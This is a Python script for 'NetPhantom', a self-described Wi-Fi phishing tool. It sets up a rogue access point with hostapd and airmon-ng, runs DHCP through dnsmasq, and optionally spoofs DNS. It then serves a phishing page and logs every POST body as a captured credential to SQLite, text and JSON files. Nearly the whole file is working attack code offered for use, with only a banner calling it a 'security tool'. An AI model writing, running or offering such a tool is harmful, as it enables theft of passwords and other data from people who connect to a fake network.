#!/usr/bin/env python3

import argparse
import logging
import sys
import time
import json
import os
import subprocess
import sqlite3
from concurrent.futures import ThreadPoolExecutor
from scapy.all import *
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
import dns.resolver
import dns.message
import dns.rdataclass
import dns.rdatatype
import socket

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('netphantom.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class FakeHTTPServer(BaseHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        self.netphantom = kwargs.pop('netphantom')
        super().__init__(*args, **kwargs)

    def do_GET(self):
        self.handle_request('GET')

    def do_POST(self):
        self.handle_request('POST')

    def handle_request(self, method):
        """Handle HTTP requests and log credentials."""
        request_data = {
            'method': method,
            'path': self.path,
            'headers': dict(self.headers),
            'body': None,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        }

        if method == 'POST':
            content_length = int(self.headers.get('Content-Length', 0))
            request_data['body'] = self.rfile.read(content_length).decode('utf-8', errors='ignore')
            logger.info(f"Credential captured: {request_data['body']}")
            self.netphantom.store_credential(request_data)

        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        with open(self.netphantom.phishing_page, 'rb') as f:
            self.wfile.write(f.read())

class NetPhantom:
    def __init__(self, interface: str, ssid: str, phishing_page: str, dns_spoof: bool, 
                 threads: int = 5, quiet: bool = False):
        self.interface = interface
        self.ssid = ssid
        self.phishing_page = phishing_page
        self.dns_spoof = dns_spoof
        self.threads = threads
        self.quiet = quiet
        self.output_dir = 'netphantom-output'
        self.output_file = os.path.join(self.output_dir, 
            f"phantom_{ssid}_{time.strftime('%Y%m%d_%H%M%S')}.txt")
        self.json_file = os.path.join(self.output_dir, 
            f"phantom_{ssid}_{time.strftime('%Y%m%d_%H%M%S')}.json")
        self.db_file = os.path.join(self.output_dir, 'netphantom.db')
        os.makedirs(self.output_dir, exist_ok=True)
        self.credentials = []
        self.dns_mappings = {'example.com': '192.168.1.100'}  # Example mapping
        self.init_db()
        if quiet:
            logging.getLogger().handlers = [logging.FileHandler('netphantom.log')]

    def init_db(self):
        """Initialize SQLite database for storing credentials."""
        with sqlite3.connect(self.db_file) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS credentials (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    method TEXT,
                    path TEXT,
                    headers TEXT,
                    body TEXT,
                    timestamp TEXT
                )
            ''')
            conn.commit()

    def store_credential(self, request_data: dict):
        """Store captured credentials in database."""
        with sqlite3.connect(self.db_file) as conn:
            cursor = conn.cursor()
            cursor.execute(
                'INSERT INTO credentials (method, path, headers, body, timestamp) VALUES (?, ?, ?, ?, ?)',
                (request_data['method'], request_data['path'], json.dumps(request_data['headers']),
                 request_data['body'], request_data['timestamp'])
            )
            conn.commit()
        self.credentials.append(request_data)

    def setup_ap(self):
        """Set up fake access point using hostapd."""
        logger.info(f"Setting up fake AP with SSID: {self.ssid}")
        hostapd_conf = f"""
interface={self.interface}
driver=nl80211
ssid={self.ssid}
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
        conf_path = os.path.join(self.output_dir, 'hostapd.conf')
        with open(conf_path, 'w') as f:
            f.write(hostapd_conf)

        try:
            subprocess.check_call(['airmon-ng', 'check', 'kill'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.check_call(['airmon-ng', 'start', self.interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.Popen(['hostapd', conf_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            logger.info("Fake AP started")
        except subprocess.CalledProcessError as e:
            logger.error(f"Failed to start fake AP: {e}")
            sys.exit(1)

    def setup_dhcp(self):
        """Set up DHCP server using dnsmasq."""
        logger.info("Setting up DHCP server")
        dnsmasq_conf = """
interface={self.interface}
dhcp-range=192.168.1.100,192.168.1.200,12h
"""
        conf_path = os.path.join(self.output_dir, 'dnsmasq.conf')
        with open(conf_path, 'w') as f:
            f.write(dnsmasq_conf.format(self=self))

        try:
            subprocess.Popen(['dnsmasq', '-C', conf_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            logger.info("DHCP server started")
        except subprocess.CalledProcessError as e:
            logger.error(f"Failed to start DHCP server: {e}")
            sys.exit(1)

    def dns_server(self):
        """Run fake DNS server for spoofing."""
        logger.info("Starting fake DNS server")
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(('0.0.0.0', 53))

        while True:
            data, addr = sock.recvfrom(1024)
            request = dns.message.from_wire(data)
            response = dns.message.make_response(request)
            for question in request.question:
                qname = question.name.to_text()
                if qname in self.dns_mappings and self.dns_spoof:
                    response.answer.append(
                        dns.rrset.from_text(qname, 3600, dns.rdataclass.IN, dns.rdatatype.A, self.dns_mappings[qname])
                    )
                else:
                    try:
                        answers = dns.resolver.resolve(qname, 'A')
                        for rdata in answers:
                            response.answer.append(
                                dns.rrset.from_text(qname, 3600, dns.rdataclass.IN, dns.rdatatype.A, rdata.to_text())
                            )
                    except Exception:
                        pass
            sock.sendto(response.to_wire(), addr)

    def run_http_server(self):
        """Run fake HTTP server for phishing."""
        logger.info("Starting fake HTTP server on 0.0.0.0:80")
        server = HTTPServer(('0.0.0.0', 80), 
            lambda *args, **kwargs: FakeHTTPServer(*args, netphantom=self, **kwargs))
        server.serve_forever()

    def save_results(self):
        """Save captured credentials to files."""
        with open(self.output_file, 'a') as f:
            for cred in self.credentials:
                f.write(f"[{cred['timestamp']}] {cred['method']} {cred['path']}: {cred['body']}\n")
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Phantom run complete\n")

        with open(self.json_file, 'w') as f:
            json.dump({
                'ssid': self.ssid,
                'interface': self.interface,
                'credentials': self.credentials,
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
            }, f, indent=4)

        logger.info(f"Results saved to {self.output_file} and {self.json_file}")

    def run(self):
        """Run NetPhantom phishing tool."""
        if not os.path.isfile(self.phishing_page):
            logger.error(f"Phishing page not found: {self.phishing_page}")
            sys.exit(1)

        logger.info(f"Starting NetPhantom with SSID: {self.ssid}")
        self.setup_ap()
        self.setup_dhcp()

        # Start HTTP server in a thread
        http_thread = threading.Thread(target=self.run_http_server)
        http_thread.daemon = True
        http_thread.start()

        # Start DNS server in a thread if spoofing enabled
        if self.dns_spoof:
            dns_thread = threading.Thread(target=self.dns_server)
            dns_thread.daemon = True
            dns_thread.start()

        try:
            while True:
                time.sleep(1)  # Keep main thread alive
        except KeyboardInterrupt:
            logger.info("NetPhantom stopped by user")
            self.save_results()
            subprocess.check_call(['airmon-ng', 'stop', f"{self.interface}mon"], 
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            sys.exit(0)

def main():
    parser = argparse.ArgumentParser(
        description="NetPhantom: A Wi-Fi and Ethernet phishing tool.",
        epilog="Example: ./netphantom.py -i wlan0 -s MyAP -p login.html --dns-spoof -T 5"
    )
    parser.add_argument('-i', '--interface', required=True, 
                       help="Wireless interface (e.g., wlan0)")
    parser.add_argument('-s', '--ssid', required=True, 
                       help="SSID for fake AP (e.g., MyAP)")
    parser.add_argument('-p', '--phishing-page', default='login.html', 
                       help="Phishing page file (default: login.html)")
    parser.add_argument('--dns-spoof', action='store_true', 
                       help="Enable DNS spoofing")
    parser.add_argument('-T', '--threads', type=int, default=5, 
                       help="Number of threads (default: 5)")
    parser.add_argument('-q', '--quiet', action='store_true', 
                       help="Quiet mode (log to file only)")

    args = parser.parse_args()

    print("""
    ==============================
         NetPhantom v1.0
      Phishing Security Tool
    ==============================
    """)

    try:
        phantom = NetPhantom(
            interface=args.interface,
            ssid=args.ssid,
            phishing_page=args.phishing_page,
            dns_spoof=args.dns_spoof,
            threads=args.threads,
            quiet=args.quiet
        )
        phantom.run()
    except KeyboardInterrupt:
        logger.info("NetPhantom interrupted by user")
        sys.exit(0)
    except Exception as e:
        logger.error(f"Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()